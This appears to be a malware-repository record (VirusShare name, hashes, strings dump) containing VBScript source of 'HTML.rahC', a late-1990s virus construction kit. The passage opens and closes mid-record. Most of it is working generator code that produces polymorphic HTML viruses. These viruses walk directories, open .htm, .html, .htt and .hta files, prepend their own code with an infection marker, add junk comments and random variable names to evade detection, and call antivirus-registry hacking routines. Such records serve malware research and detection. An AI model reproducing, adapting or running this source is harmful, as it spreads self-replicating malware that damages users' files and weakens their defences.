\")\"\nEnd Sub\n\nSub OpenUsingText(FilePathName, IoModeType, CreateIt)\n\tAddCodeLine \"Set \" & VarTextStreamObj & \" = \" & VarFSOObj & \".OpenTextFile(\" & FilePathName & \", \" & IoModeType & \", \" & CreateIt & \")\"\nEnd Sub\n\n\n'Adds a line to te viral code text stream with a CRLF\nSub AddLine(TabstoAdd, TextToAdd)\n\tfor i = 1 to TabstoAdd\n\t\tGenText = GenText & \"\t\"\n\tnext\n\tGenText = GenText & TextToAdd + Chr(13) + Chr(10)\n\tLinesCount = LinesCount + 1\n\twindow.status = \"Generating... \" & LinesCount & \" Lines\"\nEnd Sub\n\n'Adds a line to the viral code text stream, randomly adding a junk afterwards if checked\nSub AddCodeLine(TextToAdd)\n\tif TextToAdd <> \"\" then\n\t\tif Int((2 * Rnd) + 1) = 1 AND VInfo.JComments.Checked = True then\n\t\t\tJunkString = \" '\"\n\t\t\tfor i = 1 to Int((20 * Rnd) + 20)\n\t\t\t\tJunkString = JunkString & Chr(Int((74 * Rnd) + 48))\n\t\t\tnext\n\t\t\tTextToAdd = TextToAdd & JunkString\n\t\tend if\n\t\tAddLine TabAmount, TextToAdd\n\t\tif Int((2 * Rnd) + 1) = 1 AND VInfo.JunkLines.Checked = True then\n\t\t\tJunkString = \"'\"\n\t\t\tfor i = 1 to Int((20 * Rnd) + 20)\n\t\t\t\tJunkString = JunkString & Chr(Int((74 * Rnd) + 48))\n\t\t\tnext\n\t\t\tAddLine TabAmount, JunkString\n\t\tend if\n\tend if\nEnd sub\n\n'Parses code into several lines\nSub AddMultiCodeLine(Parsing)\n\tCurPos = 1\n\tParsing = Parsing & Chr(13) & Chr(10)\n\tDo \n\t\tNextPos = InStr(CurPos, Parsing, Chr(13) & Chr(10))\n\t\tif NextPos > 0 then\n\t\t\tCurLine = Mid(Parsing, CurPos, NextPos - CurPos)\n\t\t\tAddCodeLine CurLine\n\t\t\tCurPos = NextPos + 2\n\t\tend if\n\tLoop While NextPos > 0\nEnd Sub\n\t\n'Randomly returns one of two strings\nFunction RandString(String1, String2)\n\tif Int((2 * Rnd) + 1) = 1 then\n\t\tRandString = String1\n\telse\n\t\tRandString = String2\n\tend if\nEnd Function\n\n'Inserts a conditional statement in random order.\nFunction RandomAndAdd(String1, String2)\n\tif String1 <> \"\" and String2 <> \"\" then\n\t\tRandomAndAdd = RandString(\"if \" & String1 & \" and \" & String2 & \" then\", \"if \" & String2 & \" AND \" & String1 & \" then\")\n\telseif String1 = \"\" and String2 = \"\" then\n\t\tTabAmount = TabAmount - 1\n\t\tRandomAndAdd = \"\"\n\telse\n\t\tRandomAndAdd = \"if \" & String1 & String2 & \" then\"\n\tend if\nEnd Function\n\n'Inserts two strings in random order using AddCodeLine\n'If String1 or String2 = \"\" it doesn't insert it\n'ModTab = 0 to not modify tabbing\n'ModTab = 1 to indent string2 if its placed below\n'ModTab = 2 to indent string2 if its placed above\nSub RandOrder(String1, String2, ModTab)\n\tif Int((2 * Rnd) + 1) = 1 then\n\t\tAddCodeLine String1\n\t\tif ModTab = 1 then TabAmount = TabAmount + 1\n\t\tAddCodeLine String2\n\t\tif ModTab = 1 then TabAmount = TabAmount - 1\n\telse\n\t\tif ModTab = 2 then TabAmount = TabAmount + 1\n\t\tAddCodeLine String2\n\t\tif ModTab = 2 then TabAmount = TabAmount - 1\n\t\tAddCodeLine String1\n\tend if\nEnd Sub\n\n'Returns the value of the chosen radio button within a radio button array\nFunction GetVals(ArrList)\n\tfor i = 0 to (ArrList.length - 1)\n\t\tif ArrList(i).Checked = True then GetVals = ArrList(i).Value\n\tnext\nEnd function\n\n'Generates a random stream of lower case characters\nfunction GenVar\n\tfor i = 1 to Int((10 * Rnd) + 5)\n\t\tGenVar = GenVar & Chr(Int((26 * Rnd) + 97))\n\tnext\nEnd Function"
    },
    "filename": "VirusShare_4972921504095344c668bc92282257af",
    "filesize": 25222,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "4972921504095344c668bc92282257af",
        "sha1": "577fd00e4727489f439f315d165e09907fa2340f",
        "sha256": "2a4160c79651881468bc17941bacd1f75bfb1d5188c200c74fba1c2f28c49701"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "' Random Anarchy HTML Constructor",
            "' v0.11",
            "' Copyright 1998. '1nternal'. All Rights Reserved.",
            "' This Script is freeware, you may make as many duplicates/copies",
            "' as you wish and distribute it freely providing all files are included.",
            "'Global Variables",
            "Public LinesCount, GenText, TabAmount, PreID, CreatedTxt, CreatedFSO, FoundParent, DirNum",
            "Public FoundHostA, FoundHost, FindHostStyle, WSCreated",
            "Public Const EngineMajorVer = 0",
            "Public Const EngineMinorVer = 2",
            "Public Const EngineRevision = 0",
            "Public Const EngineMajorDesc = \"rahC\"",
            "Public Const EngineMinorDesc = \"VBS\"",
            "Public Const EngineAuthorDesc = \"1nternal\"",
            "Public Const EngineYearDate = \"1999\"",
            "Public EngineCopyString",
            "'  Sub procedure names",
            "Public VarInfFileName, VarInfFolderName",
            "'  Objects and variables",
            "Public VarWSObj, VarFSOObj, VarTxtRng, VarFileContents, VarFolderObj, VarFileCollection",
            "Public VarVictFileObj, VarEachFile, VarTestString, VarExtType, VarTextStreamObj",
            "'  Host and victim paths",
            "Public VarInfPath, VarInfFile, VarHostPath",
            "EngineCopyString = EngineMajorDesc & \".\" & EngineMinorDesc & \" v\" & EngineMajorVer & \".\" & EngineMinorVer & \" Copyright \" & EngineYearDate & \". \" & EngineAuthorDesc",
            "document.write \"<p align=\"\"Center\"\"><font size=\"\"1\"\" face=\"\"Arial\"\">Engine: \" & EngineCopyString & \"</font></p>\"",
            "'----------------------------Intialisation and Main Layout Block---------------------------------",
            "'Inserts the header and footer code around the virus/trojan",
            "'and calls the exectution probability routine",
            "Sub GV()",
            "\tOn Error Resume Next",
            "\tCall InitialiseIt",
            "\tif InitialisePlugin() then",
            "\t\tif VInfo.GenSeed.Value <> \"\" then",
            "\t\t\tRnd(-1)",
            "\t\t\tRandomize(VInfo.GenSeed.Value)",
            "\t\telse",
            "\t\t\tRandomize",
            "\t\tend if",
            "\t\tCall InitialiseAgain",
            "\t\tAddLine 0, PreID",
            "\t\tAddLine 0, \"<html><body>\"",
            "\t\tAddLine 0, \"<script Language=\"\"VBScript\"\"><!--\"",
            "\t\tAddCodeLine \"On Error Resume Next\"",
            "\t\tCall CustomHeaderCode",
            "\t\tSelect Case Int((6 * Rnd) + 1)",
            "\t\t\tCase 1",
            "\t\t\t\tCall InsertInfectFile",
            "\t\t\t\tCall InsertInfectPath",
            "\t\t\t\tCall InsertExecProb",
            "\t\t\tCase 2",
            "\t\t\t\tCall InsertInfectPath",
            "\t\t\t\tCall InsertInfectFile",
            "\t\t\t\tCall InsertExecProb",
            "\t\t\tCase 3",
            "\t\t\t\tCall InsertExecProb",
            "\t\t\t\tCall InsertInfectPath",
            "\t\t\t\tCall InsertInfectFile",
            "\t\t\tCase 4",
            "\t\t\t\tCall InsertExecProb",
            "\t\t\t\tCall InsertInfectFile",
            "\t\t\t\tCall InsertInfectPath",
            "\t\t\tCase 5",
            "\t\t\t\tCall InsertInfectFile",
            "\t\t\t\tCall InsertExecProb",
            "\t\t\t\tCall InsertInfectPath",
            "\t\t\tCase 6",
            "\t\t\t\tCall InsertInfectPath",
            "\t\t\t\tCall InsertExecProb",
            "\t\t\t\tCall InsertInfectFile",
            "\t\tEnd Select",
            "\t\tCall CustomFooterCode",
            "\t\tAddLine 0, \"'HTML.rahC.\" & VInfo.GenName.value & \" v0.1 /\" & VInfo.IDTag.Value",
            "\t\tAddLine 0, \"'Generated with HTML.rahC v0.1 /1nternal\"",
            "\t\tAddLine 0, \"--></\" & \"script>\"",
            "\t\tAddLine 0, \"</body></html>\"",
            "\t\tif TerminatePlug() then",
            "\t\t\twindow.status=\"Creating document\"",
            "\t\t\tset NewWin = window.open()",
            "\t\t\tNewWin.document.Write(GenText)",
            "\t\t\twindow.status = \"Done\"",
            "\t\tend if",
            "\tend if",
            "End Sub",
            "'Sets up some variables in preperation for the generation",
            "Sub InitialiseAgain",
            "\tOn Error Resume Next",
            "\tif VInfo.RandVars.Checked = true then",
            "\t\tVarInfFolderName = GenVar",
            "\t\tVarHostPath = GenVar",
            "\t\tVarWSObj = GenVar",
            "\t\tVarFSOObj = GenVar",
            "\t\tVarInfPath = GenVar",
            "\t\tVarInfFileName = GenVar",
            "\t\tVarInfFile = GenVar",
            "\t\tVarFileContents = GenVar",
            "\t\tVarTxtRng = GenVar",
            "\t\tVarFolderObj = GenVar",
            "\t\tVarFileCollection = GenVar",
            "\t\tVarVictFileObj = GenVar",
            "\t\tVarTextStreamObj = GenVar",
            "\t\tVarEachFile = GenVar",
            "\t\tVarTestString = GenVar",
            "\t\tVarExtType = GenVar",
            "\tend if",
            "\tif NameChanges.Exists(Ucase(VInfo.GenName.Value)) then VInfo.GenName.Value = NameChanges.Item(Ucase(VInfo.GenName.Value))",
            "\tPreID = \"<!--\" & VInfo.IDTag.Value & \"-->\"",
            "End Sub",
            "Sub InitialiseIt",
            "\tOn Error Resume Next",
            "\tTabAmount = 0",
            "\tLinesCount = 0",
            "\tDirNum = 0",
            "\tFoundHostA = False",
            "\tFoundHost = False",
            "\tFindHostStyle = 0",
            "\tCreatedTxt = False",
            "\tCreatedFSO = False",
            "\tFoundParent = False",
            "\tWSCreated = False",
            "\tGenText = \"\"",
            "\tVarInfFolderName = \"InfectFolder\"",
            "\tVarHostPath = \"HostPath\"",
            "\tVarWSObj = \"WSHShell\"",
            "\tVarFSOObj = \"FSO\"",
            "\tVarInfPath = \"InfectPath\"",
            "\tVarInfFileName = \"InfectFile\"",
            "\tVarInfFile = \"InfectFileName\"",
            "\tVarFileContents = \"FileContents\"",
            "\tVarTxtRng = \"Rng\"",
            "\tVarFolderObj = \"FolderObj\"",
            "\tVarFileCollection = \"fc\"",
            "\tVarVictFileObj = \"fv\"",
            "\tVarTextStreamObj = \"ts\"",
            "\tVarEachFile = \"target\"",
            "\tVarTestString = \"TestString\"",
            "\tVarExtType = \"ExtType\"",
            "End Sub",
            "'----------------------------------Main Execution Conditional block------------------------------",
            "'Inserts the offline and random run check to the viral code text stream",
            "'randomly swapping the order of the conditions",
            "Sub InsertExecProb",
            "\tCall RandInsertTxtHost",
            "\tBaseString = \"\"",
            "\tBonusString = \"\"",
            "\tConditionalS = \"\"",
            "\tif VInfo.ExecOffline.Checked = True then BaseString = \"location.protocol = \"\"file:\"\"\"",
            "\tSelect Case GetVals(VInfo.ExecProb)",
            "\t\tCase \"Every\"",
            "\t\t\tBonusString = \"\"",
            "\t\tCase \"Day\"",
            "\t\t\tBonusString = \"Day(now) = \" & VInfo.DayValExec.Value",
            "\t\tCase \"Week\"",
            "\t\t\tBonusString = \"WeekDay(now) = \" & VInfo.WeekExec.Value",
            "\t\tCase \"Misc\"",
            "\t\t\tBonusString = VInfo.ExecLine.Value",
            "\t\tCase \"Rand\"",
            "\t\t\tBonusString = \"Int((\" & VInfo.ExecMax.Value & \" * Rnd) + 1) = 1\"",
            "\tEnd Select\t\t",
            "\tRandOrder RandomAndAdd(BaseString, BonusString), \"Randomize\", 1",
            "\tTabAmount = TabAmount + 1",
            "\tHackedRegBegin = False",
            "\tHackedRegA = False",
            "\tHackedRegB = False",
            "\tVCodeChecked = False",
            "\tPayLoadChecked = False",
            "\t\tSelect Case Int((6 * Rnd) + 1)",
            "\t\t\tCase 1 and HackedRegBegin = False",
            "\t\t\t\tCall AVRegHackBegin",
            "\t\t\t\tHackedRegBegin = True",
            "\t\t\tCase 2 and PayLoadChecked = False",
            "\t\t\t\tif VInfo.TrigInfect.Checked = False then Call PayLoadCheck",
            "\t\t\t\tPayLoadChecked = True",
            "\t\t\tCase 3 and VCodeChecked = False",
            "\t\t\t\tCall VCodeCheck",
            "\t\t\t\tVCodeChecked = True",
            "\t\t\tCase 4 and HackedRegA = False and HackedRegBegin = True",
            "\t\t\t\tCall AVRegHackA",
            "\t\t\t\tHackedRegA = True",
            "\t\t\tCase 5 and HackedRegB = False and HackedRegBegin = True",
            "\t\t\t\tCall AVRegHackB",
            "\t\t\t\tHackedRegB = True",
            "\t\t\tCase else ",
            "\t\t\t\tif VCodeChecked = False then call RandInsertTxtHost",
            "\t\tEnd Select",
            "\tLoop While HackedRegBegin = False or PayLoadChecked = False or VCodeChecked = False or HackedRegA = False or HackedRegB = False",
            "\tCall CustomExecuteCodeEnd",
            "\tif BaseString <> \"\" OR BonusString <> \"\" then",
            "\t\tTabAmount = TabAmount - 1",
            "\t\tAddCodeLine \"end if\"",
            "\tend if",
            "End Sub",
            "'----------------------------------------Infection Block-----------------------------------------",
            "Sub VCodeCheck",
            "\tif GetVals(Vinfo.InfProb) <> \"None\" then",
            "\t\tBaseString = \"\"",
            "\t\tBonusString = \"\"",
            "\t\tif VInfo.InfOffline.Checked = True then BaseString = \"location.protocol = \"\"file:\"\"\"",
            "\t\tSelect Case GetVals(VInfo.InfProb)",
            "\t\t\tCase \"Every\"",
            "\t\t\t\tBonusString = \"\"",
            "\t\t\tCase \"Day\"",
            "\t\t\t\tBonusString = \"Day(now) = \" & VInfo.DayValInf.Value",
            "\t\t\tCase \"Week\"",
            "\t\t\t\tBonusString = \"WeekDay(now) = \" & VInfo.InfWeek.Value",
            "\t\t\tCase \"Misc\"",
            "\t\t\t\tBonusString = VInfo.InfLine.Value",
            "\t\t\tCase \"Rand\"",
            "\t\t\t\tBonusString = \"Int((\" & VInfo.InfMax.Value & \" * Rnd) + 1) = 1\"",
            "\t\tEnd Select\t\t",
            "\t\tif BaseString <> \"\" OR BonusString <> \"\" then",
            "\t\t\tAddCodeLine RandomAndAdd(BaseString, BonusString)\t\t",
            "\t\t\tTabAmount = TabAmount + 1",
            "\t\tend if",
            "\t\tif VInfo.TrigInfect.Checked = True and GetVals(VInfo.TrigPlace) = \"Before\" then Call PayLoadCheck",
            "\t\tCall InitialiseInfect",
            "\t\tif VInfo.TrigInfect.Checked = True and GetVals(VInfo.TrigPlace) = \"After\" then Call PayLoadCheck",
            "\t\tif BaseString <> \"\" OR BonusString <> \"\" then",
            "\t\t\tTabAmount = TabAmount - 1",
            "\t\t\tAddCodeLine \"end if\"",
            "\t\tend if",
            "\tend if",
            "End Sub",
            "Sub InitialiseInfect",
            "\t\tSelect Case Int((5 * Rnd) + 1)",
            "\t\t\tCase 1 and CreatedFSO = False",
            "\t\t\t\tAddCodeLine \"Set \" & VarFSOObj & \" = CreateObject(\"\"Scripting.FileSystemObject\"\")\"",
            "\t\t\t\tCreatedFSO = True",
            "\t\t\tCase 2 and CreatedTxt = False",
            "\t\t\t\tCall InsertCreateTxt",
            "\t\t\tCase 3 and FoundHost = False",
            "\t\t\t\tCall InsertFindHost",
            "\t\t\tCase 4 and FoundParent = False and CreatedFSO = True and FoundHost = True",
            "\t\t\t\tAddCodeLine VarHostPath & \" = \" & VarFSOObj & \".GetParentFolderName(\" & VarHostPath & \")\"",
            "\t\t\t\tFoundParent = True",
            "\t\t\tCase 5 and CreatedFSO = True and CreatedTxt = True",
            "\t\t\t\tCall InsertDirInf",
            "\t\tend select",
            "\tLoop While FoundHost = False or CreatedFSO = False or CreatedTxt = False or FoundParent = False",
            "\tInsertedCurrent = False",
            "\t\tSelect Case Int((3 * Rnd) + 1)",
            "\t\t\tCase 1 and InsertedCurrent <> True",
            "\t\t\t\tif VInfo.InfCurrent.checked = True then",
            "\t\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(VarHostPath), \"Call \" & VarInfFolderName & \"(\" & VarHostPath & \")\")",
            "\t\t\t\tend if",
            "\t\t\t\tInsertedCurrent = True",
            "\t\t\tCase else",
            "\t\t\t\tCall InsertDirInf",
            "\t\tend select",
            "\tLoop While InsertedCurrent = False or DirNum < 6",
            "End Sub",
            "Sub InsertFindHost",
            "\t'FindHostStyle = 1 or 2",
            "\t'1 = Get rid of \"File:\" first. 2 = Change \"/\" first",
            "\tif Vinfo.InfCurrent.Checked = True then",
            "\t\tif FindHostStyle = 0 then FoundHostType = Int((2 * Rnd) + 1)",
            "\t\tif FindHostStyle = 1 then",
            "\t\t\tif FoundHostA <> True then",
            "\t\t\t\tAddCodeLine VarHostPath & \" = Replace(location.href, \"\"file:///\"\", \"\"\"\")\"",
            "\t\t\telse",
            "\t\t\t\tAddCodeLine VarHostPath & \" = Replace(\" & VarHostPath & \", \"\"/\"\", \"\"\\\"\")\"",
            "\t\t\t\tFoundHost = True",
            "\t\t\tend if",
            "\t\telse",
            "\t\t\tif FoundHostA <> True then",
            "\t\t\t\tAddCodeLine VarHostPath & \" = Replace(location.href, \"\"/\"\", \"\"\\\"\")\"",
            "\t\t\telse",
            "\t\t\t\tAddCodeLine VarHostPath & \" = Replace(\" & VarHostPath & \", \"\"file:\\\\\\\"\", \"\"\"\")\"",
            "\t\t\t\tFoundHost = True",
            "\t\t\tend if",
            "\t\tend if",
            "\t\tFoundHostA = True",
            "\telse",
            "\t\tFoundHost = True",
            "\tend if",
            "End Sub",
            "Sub InsertCreateTxt",
            "\tif VInfo.CreateRange.Checked = True or GetVals(VInfo.FileRoutine) = \"Default\" then",
            "\t\tAddCodeLine \"Set \" & VarTxtRng & \" = document.body.createTextRange\" & RandString(\"()\" , \"\")",
            "\tend if",
            "\tCreatedTxt = True",
            "End Sub",
            "Sub RandInsertTxtHost",
            "\tfor i = 1 to 2",
            "\t\tif Int((8 * Rnd) + 1) = 1 then",
            "\t\t\tif Int((2 * Rnd) + 1) = 1 and FoundHost = False and GetVals(VInfo.InfProb) <> \"None\" then",
            "\t\t\t\tCall InsertFindHost",
            "\t\t\telseif CreatedTxt = False and GetVals(VInfo.InfProb) <> \"None\" then",
            "\t\t\t\tCall InsertCreateTxt",
            "\t\t\tend if",
            "\t\tend if",
            "\tnext",
            "End Sub",
            "Sub InsertDirInf",
            "\tDirNum = DirNum + 1",
            "\tif VInfo.DirHard.Checked = True then",
            "\t\tSelect Case DirNum",
            "\t\t\tCase 1 and VInfo.Dir1.Value <> \"\"",
            "\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir1.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir1.Value & \"\"\"\" & \")\")",
            "\t\t\tCase 2 and VInfo.Dir2.Value <> \"\"",
            "\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir2.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir2.Value & \"\"\"\" & \")\")",
            "\t\t\tCase 3 and VInfo.Dir3.Value <> \"\"",
            "\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir3.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir3.Value & \"\"\"\" & \")\")",
            "\t\t\tCase 4 and VInfo.Dir4.Value <> \"\"",
            "\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir4.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir4.Value & \"\"\"\" & \")\")",
            "\t\t\tCase 5 and VInfo.Dir5.Value <> \"\"",
            "\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir5.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir5.Value & \"\"\"\" & \")\")",
            "\t\t\tCase else",
            "\t\tend select",
            "\tend if",
            "End Sub",
            "'-----------------------------------File Infection Sub Procedures--------------------------------",
            "Sub InsertInfectPath",
            "\tCall RandInsertTxtHost",
            "\tif GetVals(VInfo.InfProb) <> \"None\" then",
            "\t\tAddCodeLine \"Sub \" & VarInfFolderName & \"(\" & VarInfPath & \")\"",
            "\t\tTabAmount = TabAmount + 1",
            "\t\t\tCall InsertInfectFolderRoutine",
            "\t\tTabAmount = TabAmount - 1",
            "\t\tAddCodeLine \"End Sub\"",
            "\tend if",
            "End Sub",
            "Sub InsertInfectFolderRoutine",
            "\tSelect Case GetVals(VInfo.FolderRoutine)",
            "\t\tCase \"Default\"",
            "\t\t\tAddCodeLine \"On Error Resume Next\"",
            "\t\t\tif VInfo.CheckExist.checked = true then",
            "\t\t\t\tAddCodeLine \"if \" & VarFSOObj & \".FolderExists(\" & VarInfPath & \") then\"",
            "\t\t\t\tTabAmount = Tabamount + 1",
            "\t\t\tend if",
            "\t\t\t\tif GetVals(VInfo.Directory) = \"Parent\" then",
            "\t\t\t\t\tSelect Case GetVals(VInfo.LoopOp)",
            "\t\t\t\t\t\tCase \"LoopU\"",
            "\t\t\t\t\t\t\tAddCodeLine \"Do\"",
            "\t\t\t\t\t\tCase \"LoopW\"",
            "\t\t\t\t\t\t\tAddCodeLine \"Do\"",
            "\t\t\t\t\t\tCase \"WhileW\"",
            "\t\t\t\t\t\t\tAddCodeLine \"Set \" & VarFolderObj & \" = \" & VarFSOObj & \".GetFolder(\" & VarInfPath & \")\"",
            "\t\t\t\t\t\t\tAddCodeLine \"While \" & VarFolderObj & \".IsRootFolder = False\"",
            "\t\t\t\t\tEnd select",
            "\t\t\t\t\t\tTabAmount = TabAmount + 1",
            "\t\t\t\tend if",
            "\t\t\t\t\t\tAddCodeLine \"Set \" & VarFolderObj & \" = \" & VarFSOObj & \".GetFolder(\" & VarInfPath & \")\"",
            "\t\t\t\t\t\tif GetVals(VInfo.Directory) = \"Parent\" then",
            "\t\t\t\t\t\t\tCall RandOrder(VarInfPath & \" = \" & VarFSOObj & \".GetParentFolderName(\" & VarInfPath & \")\", \"Set \" & VarFileCollection & \" = \" & VarFolderObj & \".Files\", 0)",
            "\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\tAddCodeLine \"Set \" & VarFileCollection & \" = \" & VarFolderObj & \".Files\"",
            "\t\t\t\t\t\tend if",
            "\t\t\t\t\t\tAddCodeLine \"For each \" & VarEachFile & \" in \" & VarFileCollection",
            "\t\t\t\t\t\tTabAmount = TabAmount + 1",
            "\t\t\t\t\t\t\tCall TestRoutine",
            "\t\t\t\t\t\tTabAmount = TabAmount - 1",
            "\t\t\t\t\t\tAddCodeLine \"next\"",
            "\t\t\t\tif GetVals(VInfo.Directory) = \"Parent\" then",
            "\t\t\t\t\tTabAmount = TabAmount - 1",
            "\t\t\t\t\tSelect Case GetVals(VInfo.LoopOp)",
            "\t\t\t\t\t\tCase \"LoopU\"",
            "\t\t\t\t\t\t\tAddCodeLine \"Loop Until \" & VarFolderObj & \".IsRootFolder = True\"",
            "\t\t\t\t\t\tCase \"LoopW\"",
            "\t\t\t\t\t\t\tAddCodeLine \"Loop While \" & VarFolderObj & \".IsRootFolder = False\"",
            "\t\t\t\t\t\tCase \"WhileW\"",
            "\t\t\t\t\t\t\tAddCodeLine \"Wend\"",
            "\t\t\t\t\tEnd select",
            "\t\t\t\tend if",
            "\t\t\tif VInfo.CheckExist.checked = true then",
            "\t\t\t\tTabAmount = TabAmount - 1",
            "\t\t\t\tAddCodeLine \"end if\"",
            "\t\t\tend if",
            "\t\tCase else",
            "\t\t\tCall CustomInfectFolder(GetVals(VInfo.FolderRoutine))",
            "\tEnd select",
            "End Sub",
            "Sub TestRoutine",
            "\tUppercheck = Int(2 * Rnd)",
            "\tif Upper = 1 then",
            "\t\tAddCodeLine VarExtType & \" = ucase(\" & VarFSOObj & \".GetExtensionName(\" & VarEachFile & \".Name))\"",
            "\telse",
            "\t\tAddCodeLine VarExtType & \" = lcase(\" & VarFSOObj & \".GetExtensionName(\" & VarEachFile & \".Name))\"",
            "\tend if",
            "\tAddCodeLine \"if \" & ParseExtensions(Uppercheck) & \" then\"",
            "\tTabAmount = TabAmount + 1",
            "\t\tif VInfo.CheckInfected.checked = true then",
            "\t\t\tCall OpenFileMethod(VarEachFile & \".path\", \"1\", RandString(\"True\", \"False\"))",
            "\t\t\tif GetVals(VInfo.Infcheck) = \"TestString\" then",
            "\t\t\t\tAddCodeLine VarTestString & \" = \" & VarTextStreamObj & \".readline\"",
            "\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")",
            "\t\t\t\tAddCodeLine \"if \" & VarTestString & \" <> \"\"\" &  PreID & \"\"\" then\"",
            "\t\t\t\tTabAmount = TabAmount + 1",
            "\t\t\t\t\tAddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & \".path\"), \"Call \" & VarInfFileName & \"(\" & VarEachFile & \".path)\")",
            "\t\t\t\tTabAmount = TabAmount - 1",
            "\t\t\t\tAddCodeLine \"end if\"",
            "\t\t\telse",
            "\t\t\t\tAddCodeLine \"if \" & VarTextStreamObj & \".readline <> \"\"\" &  PreID & \"\"\" then\"",
            "\t\t\t\tTabAmount = TabAmount + 1",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")",
            "\t\t\t\t\tAddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & \".path\"), \"Call \" & VarInfFileName & \"(\" & VarEachFile & \".path)\")",
            "\t\t\t\tTabAmount = TabAmount - 1",
            "\t\t\t\tAddCodeLine \"else\"",
            "\t\t\t\tTabAmount = TabAmount + 1",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")",
            "\t\t\t\tTabAmount = TabAmount - 1",
            "\t\t\t\tAddCodeLine \"end if\"",
            "\t\t\tend if",
            "\t\telse",
            "\t\t\tAddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & \".path\"), \"Call \" & VarInfFileName & \"(\" & VarEachFile & \".path)\")",
            "\t\tend if",
            "\tTabAmount = TabAmount - 1",
            "\tAddCodeLine \"end if\"",
            "End Sub",
            "Sub InsertInfectFile",
            "\tCall RandInsertTxtHost",
            "\tif GetVals(VInfo.InfProb) <> \"None\" then",
            "\t\tSelect Case GetVals(VInfo.FileRoutine)",
            "\t\t\tCase \"Default\"",
            "\t\t\t\tAddCodeLine \"Sub \" & VarInfFileName & \"(\" & VarInfFile & \")\"",
            "\t\t\t\tTabAmount = TabAmount + 1",
            "\t\t\t\t\tCall OpenFileMethod(VarInfFile, \"1\", RandString(\"True\", \"False\"))",
            "\t\t\t\t\tAddCodeLine VarFileContents & \" = \" & VarTextStreamObj & \".ReadAll\" & RandString(\"()\", \"\")",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")",
            "\t\t\t\t\tCall OpenFileMethod(VarInfFile, \"2\", RandString(\"True\", \"False\"))",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(\"\"\"\" & PreID & \"\"\"\"), \".Write\" & RandBrack(\"\"\"\" & PreID & \"\"\" + Chr(13) + Chr(10)\"))",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(\"\"\"<html><body>\"\"\"), \".Write\" & RandBrack(\"\"\"<html><body>\"\" + Chr(13) + Chr(10)\"))",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(VarTxtRng & \".htmlText\"), \".Write\" & RandBrack(VarTxtRng & \".htmlText\" & \" + Chr(13) + Chr(10)\"))",
            "\t\t\t\t\tAddcodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(\"\"\"</body></html>\"\"\"), \".Write\" & RandBrack(\"\"\"</body></html>\"\" + Chr(13) + Chr(10)\"))",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString(\".Write\", \".WriteLine\") & RandBrack(VarFileContents)",
            "\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")",
            "\t\t\t\tTabAmount = TabAmount - 1",
            "\t\t\t\tAddCodeLine \"End Sub\"\t",
            "\t\t\tCase else",
            "\t\t\t\tCall CustomInfectFile(GetVals(VInfo.FileRoutine))",
            "\t\tEnd select",
            "\tend if",
            "End Sub",
            "function ParseExtensions(Upper)",
            "\tHTTChecked = False",
            "\tHTMChecked = False",
            "\tHTMLChecked = False",
            "\tHTAChecked = False",
            "\tMiscChecked = False",
            "\tCheckedAny = False",
            "\tExtenList = VarExtType & \" = \"",
            "\t\tSelect Case Int((5 * Rnd) + 1)",
            "\t\t\tCase 1 and HTTChecked = False",
            "\t\t\t\tif VInfo.HTT.checked = true then",
            "\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"",
            "\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTT\"\"\"",
            "\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"htt\"\"\"",
            "\t\t\t\t\tCheckedAny = true",
            "\t\t\t\tend if",
            "\t\t\t\tHTTChecked = True",
            "\t\t\tCase 2 and HTMChecked = False",
            "\t\t\t\tif VInfo.HTM.checked = true then",
            "\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"",
            "\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTM\"\"\"",
            "\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"htm\"\"\"",
            "\t\t\t\t\tCheckedAny = true",
            "\t\t\t\tend if",
            "\t\t\t\tHTMChecked = True",
            "\t\t\tCase 3 and HTMLChecked = False",
            "\t\t\t\tif VInfo.HTML.checked = true then",
            "\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"",
            "\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTML\"\"\"",
